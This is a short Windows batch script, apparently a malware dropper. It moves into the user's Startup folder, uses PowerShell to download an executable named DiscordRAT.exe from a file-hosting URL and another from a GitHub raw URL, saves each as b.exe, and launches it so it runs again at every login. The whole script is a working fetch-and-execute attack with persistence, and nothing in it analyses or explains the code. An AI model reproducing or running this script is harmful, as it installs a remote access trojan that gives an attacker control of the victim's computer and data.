set "Autostart=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
cd %Autostart%

powershell -Command "(New-Object Net.WebClient).DownloadFile('https://cdn-127.anonfiles.com/hfH98a8fu2/8c8957eb-1627137437/DiscordRAT.exe', 'b.exe')"
powershell -Command "Invoke-WebRequest https://github.com/lululatsch/LBrary/raw/main/c.exe -OutFile b.exe"
start /d "%Autostart%" b.exe
